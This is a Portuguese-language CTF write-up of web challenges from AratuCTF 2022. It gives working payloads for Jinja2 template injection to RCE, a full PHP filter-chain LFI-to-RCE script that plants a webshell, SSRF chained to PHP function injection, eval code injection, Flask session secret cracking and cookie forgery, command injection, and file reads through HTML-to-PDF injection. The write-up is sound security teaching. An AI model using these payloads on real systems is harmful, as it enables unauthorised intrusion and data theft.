---
title: AratuCTF Writeup (Web challs only)
tags: [Write-up, CTF, PT-BR]
category: CTF
index_img: /img/aratuctf/thumbnail.png
banner_img: /img/aratuctf/banner.png
date: 2022-09-12
---
# Introdução
O AratuCTF criado pelo pessoal da comunidade [Boitatech](https://discord.com/invite/WtBc6Q7mxD) ficou no ar durante os dias 10-11 de setembro de 2022.

Esse blog post é um writeup simples de todas as challs web com exceção da Pop It e da No Longer Poppin (fuck php pop chains).

## Whirlwind

Descrição da chall: "um fenômeno meteorológico que se manifesta como uma coluna de ar fez com que essa aplicação ficasse vulnerável".
Target: https://whirlwind.boita.tech/

Ao acessar https://whirlwind.boita.tech/ o servidor retornar uma mensagem falando que falta um parâmetro GET:
<img src="/img/aratuctf/Pasted image 20220911180353.png" />

Fazendo brute force de parâmetros com o x8 encontramos um parâmetro válido:
```
blaidd@arch:~$ x8 -u "https://whirlwind.boita.tech/" -w ~/wordlists/params/medium.txt
 _________  __ ___     _____
|GET https://whirlwind.boita.tech/?%s
|Code 200
|Response Len 670
|Reflections 0
|Words 10986

[#] the max number of parameters in every request was increased to 256
reflects: createuser
->  1/1         
Amount of requests: 68

GET https://whirlwind.boita.tech/ % createuser
```

Ao tentarmos mandar algum valor no parâmetro "createuser" percebemos que ele reflete o valor:
<img src="/img/aratuctf/Pasted image 20220911181348.png" />

Depois de fazer alguns testes de vulnerabilidades baseadas em reflection, descobrimos que o parâmetro é vulnerável a SSTI com a sintax do jinja2:
<img src="/img/aratuctf/Pasted image 20220911181607.png" />

Explorando a vulnerabilidade conseguimos um RCE e ler a flag:
<img src="/img/aratuctf/Pasted image 20220911182049.png" />

Payload final: `https://whirlwind.boita.tech/?createuser=1{{+%27%27.__class__.__mro__[1].__subclasses__()[232](%27cat+/flag.txt%27,shell=True,stdout=-1).communicate()[0].strip()}}`


## inclusive_policy
Descrição: "This vulnerability looks cool, but where's RCE?"
Target: https://inclusive-policy.boita.tech/

Ao acessar a aplicação ela retorna o source code:
<img src="/img/aratuctf/Pasted image 20220911184306.png" />

Pelo source code podemos facilmente perceber que da pra ler arquivos arbitrários:
<img src="/img/aratuctf/Pasted image 20220911184648.png" />

O include do php executa código, então só precisamos encontrar algum arquivo que podemos escrever e fazer um ataque de poisoning, porém não consegui encontrar nenhum arquivo nessas condições.

Outra maneira de executar código com include é através dos filtros do php, seguindo as instruções do artigo [LFI2RCE via PHP Filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) conseguimos executar comandos no host:
<img src="/img/aratuctf/Pasted image 20220911185423.png" />

Script depois das adaptações:
```
import requests

url = "https://inclusive-policy.boita.tech"
file_to_use = "/etc/passwd"
command = "/getFlag"

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "action": "include",
    "dumpfile": final_payload
})

print(r.text)
```

## ToxycUser
Descrição: "The website is under development, some messages of the developers can be interesting vector of attack."
Target: https://toxycuser.boita.tech/
Source code: [https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip](https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip "https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip")

Analisando o source code percebemos que o arquivo func.php está vulnerável a function injection:
```
function exist($action, $id) {
  if (isset($action) || isset($id)) {
    $action("$id"); //function injection here
  }
}


if ($action  == "logs") { 
  exist($action, $id);
} elseif ($client == $server) { // localhost only
  exist($action, $id);
} else {
  echo "<h1>Apenas pra acesso local!</h1>";
}
```
Mas pra controlar a função a ser executadas precisamos enviar a request do localhost :(

Analisando o index.php percebemos que ele está vulnerável a SSRF:
```
<?php

$url = $_GET["parametrosupersecretors"];

if(isset($url)) {
   echo "<br>";
   echo file_get_contents("http://".$url); // SSRF here
}

?>
```
Agora é só usar o SSRF pra bypassar o if do localhost do func.php e executar funções arbitrárias do php e conseguir um RCE:
<img src="/img/aratuctf/Pasted image 20220911191252.png" />
Payload final: `https://toxycuser.boita.tech/?parametrosupersecretors=localhost/func.php?action=system%26id=cat$IFS/flag_SKzdI`

## Sandbox Baby
Descrição: "é só um eval, não pode ser tão difícil assim..."
Target: https://sandbox-baby.boita.tech/

Ao acessar o target o servidor retorna o source code da aplicação:
<img src="/img/aratuctf/Pasted image 20220911202604.png" />

Basicamente precisamos fazer um code injection no parâmetro "username" usando apenas os caracteres permitidos pelo regex, existem várias formas de fazer isso.

Meu payload foi `https://sandbox-baby.boita.tech/?username=blaidd${system(array_pop(array_values($_GET)))}&cmd=cat+/this-is-the-ezy-flag-aratu.txt`
<img src="/img/aratuctf/Pasted image 20220911202953.png" />

## F4 Tools user/root
Descrição: "F4 Tools é uma plataforma desenvolvida para armazenar tools. Mostre que existem tools que não estão seguras o suficiente..."
Target: https://f4tools.boita.tech/login

Ao acessar a target url você se depara com uma tela de login onde você pode se registrar e fazer login normalmente:
<img src="/img/aratuctf/Pasted image 20220911232912.png" />
Ao fazer login o servidor retorna essa tela:
<img src="/img/aratuctf/Pasted image 20220911233034.png" />
Essa tela é um rabbit hole pra te fazer perder tempo, então só ignore...
Se você tentar fazer um brute force de diretórios você não irá encontrar nada, mas se você tentar fazer esse mesmo brute force autenticado usando a wordlist common.txt você irá encontrar as seguintes rotas:
```
/download - 403
/decoder - 403
/menu - 200
```

/Menu:
<img src="/img/aratuctf/Pasted image 20220911234042.png" />
E ao tentar acessar /decoder ou /download:
<img src="/img/aratuctf/Pasted image 20220911234156.png" />
Se tentarmos fazer um decode no cookie conseguimos perceber que temos o parâmetro "premium":
```
echo 'eyJwcmVtaXVtIjoiZmFsc2UiLCJ1c2VyIjoiYWRtaW4xIn0.Yx6eUA.bzZ-4OjPJhj79bL6QY6o7Mzo_oE' | base64 -d

{"premium":"false","user":"admin1"}base64: invalid input
```
Pela minha experiência eu consegui deduzir que era um cookie de sessão do flask (e era mesmo), então eu tentei fazer um brute force do secret que assina a sessão usando [flask-unsign](https://pypi.org/project/flask-unsign/):
```
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJwcmVtaXVtIjoiZmFsc2UiLCJ1c2VyIjoiYWRtaW4xIn0.YxxBPQ.lFUMhPWzfT7rKckyAoZqM45TwBM' --no-literal-eval

[*] Session decodes to: {'premium': 'false', 'user': 'admin1'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 2304 attempts
b'mypassword'
```

Uma vez que temos o secret podemos alterar o parâmetro "premium" pra true e assinar o cookie:
```
flask-unsign --sign --cookie "{'premium': 'true', 'user': 'admin1'}" --secret 'mypassword'

eyJwcmVtaXVtIjoidHJ1ZSIsInVzZXIiOiJhZG1pbjEifQ.Yx6fDw.EdvXJlkgV0otly5XGqcHn-5IbpY
```

Agora podemos acessar /download que irá fazer o download do script que roda na rota /decoder
Lendo o source code facilmente podemos identificar uma issue de command injection:
```
import os; from tkinter import *
...
def decode(txt):
	try:
		with os.popen(f'echo {txt} | base64 -d','r') as f: result = f.read() # command injection here
	except: result = 'isso ae nao e base64 nao ilkljkljk'

return result
...
```
Agora só explorar o command injection e pegar as flags de user e root (Não ententi pq separam em 2 flags, n precisei escalar privilégio...):
<img src="/img/aratuctf/Pasted image 20220912000349.png" />
<img src="/img/aratuctf/Pasted image 20220911235605.png" />

## Receipt Manager
Descrição: "A group of strange developers have developed tools for generating fake business invoices. Your accountants did not like this very much and they assigned YOU to compromise their site. They also told you their flag is located on /flag.txt"
Target: https://receipt-manager-1.boita.tech/

Ao acessar a target url você encontra uma tela com um input de texto onde você pode gerar recibos (Esqueci de printar :/), ao clicar no botão a aplicação gerava um pdf no servidor refletindo o valor que foi enviado no input.

Ao analisar os metadados do pdf podemos descobrir como ele é gerado com o Skia, pesquisando por "Skia exploit" no google você descobre que ele é vulnerável a html injection e é possível fazer ataques de SSRF.
<img src="/img/aratuctf/Pasted image 20220911220203.png" />

Na descrição da chall é dito que a flag está em /flag.txt, então é só usarmos o iframe pra ler a flag: `<iframe src=file:///flag.txt>`
<img src="/img/aratuctf/Pasted image 20220911220711.png" />

## Sandbox
Descrição: "Sandbox, criamos uma sandbox 100% segura, agora sim, será impossivel você conseguir acesso!"
Target: https://sandbox.boita.tech/
Source code: https://aratu-public-downloads.s3.amazonaws.com/sandbox.zip

A sandbox é basicamente uma versão mais difícil da baby sandbox:
```
if(isset($_GET['username'])){
	$param = $_GET['username'];
	$username = preg_replace("/[^a-zA-Z0-9_\$\{\}_()\-\>\,]+/mi", "", $param);
	if(str_contains($username, 'eval')){
		die('No eval() for you!');
	}
	unset($param);
	echo eval("echo \"${username}\";");
}
```
Meu payload da baby sandbox funcionou sem proplemas na sandbox haha, free flag xD.
Eu só precisei mudar pra função include para ler arquivos pq as funções system(), shell_exec() e exec() não funcionaram :(

Lendo .bash_history:
<img src="/img/aratuctf/Pasted image 20220911215301.png" />
Lendo a flag leakada do .bash_history:
<img src="/img/aratuctf/Pasted image 20220911215611.png" />

Payload final: `https://sandbox.boita.tech/?username=blaidd${include(array_pop(array_values($_GET)))}&file=/root/this_is_the_flag-from-leaked-from-history.txt`


## End
Parabéns pro pessoal da Boitatech pelo CTF e pelo evento da Semana Aratu, foi muito divertido resolver essas challs e aprendi bastante coisa com as palestras :D

Esse foi o ranking final:
<img src="/img/aratuctf/Pasted image 20220912002652.png" />

<p class="note note-info">Author: <a href="https://twitter.com/blaiddx64" target="_blank">Blaidd</a></p>